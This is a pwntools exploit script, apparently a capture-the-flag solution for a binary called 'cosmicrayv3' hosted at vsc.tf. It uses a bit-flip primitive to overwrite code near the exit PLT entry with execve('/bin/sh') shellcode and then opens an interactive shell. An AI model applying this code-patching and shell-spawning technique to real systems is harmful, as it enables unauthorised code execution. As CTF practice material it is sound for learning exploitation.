from pwn import *
from icecream import ic

elf = exe = ELF("./cosmicrayv3")
libc = ELF("./libc-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("vsc.tf", 7000)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004013d2
b *0x000000000040159f
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ru("Enter an address to send a cosmic ray through:")
# s(b'\xff')
sl(b'0x4015aa')
ru("Enter the bit position to flip:")
sl(b'0')

payload = asm('''mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''').hex()
n = 2
l = [payload[i:i+n] for i in range(0, len(payload), n)]
exitplt = 0x0000000000401180 + 38

ic(len(l))
binarychars = '00000000'

while l != []:
    data = l.pop()
    comp = bin(int(data, 16))[2:].rjust(8, '0')
    
    ic(binarychars)
    ic(data)
    ic(comp)
    
    ru("Enter an address to send a cosmic ray through:")
    sl(hex(exitplt))
    ru("-----------------\n")
    binarychars = rl().decode().replace('|', '').strip()
    
    for i in range(len(binarychars)):
        if binarychars[i] != comp[i]:
            ru("Enter the bit position to flip:")
            sl(str(i).encode())
            ru("Enter an address to send a cosmic ray through:")
            sl(hex(exitplt))
            ru("-----------------\n")
            binarychars = rl().decode().replace('|', '').strip()
            
    ru("Enter the bit position to flip:")
    sl(str(0).encode())
    ru("Enter an address to send a cosmic ray through:")
    sl(hex(exitplt))
    ru("-----------------\n")
    binarychars = rl().decode().replace('|', '').strip()
    ru("Enter the bit position to flip:")
    sl(str(0).encode())

    # if binarychars == comp:
    #     break

    exitplt = exitplt - 1
                
ru("Enter an address to send a cosmic ray through:")
# s(b'\xff')
sl(b'0x4015a0')
ru("Enter the bit position to flip:")
sl(b'0')

ru("Enter an address to send a cosmic ray through:")
# s(b'\xff')
sl(b'0')
ru("Enter the bit position to flip:")
sl(b'0')
    

io.interactive()
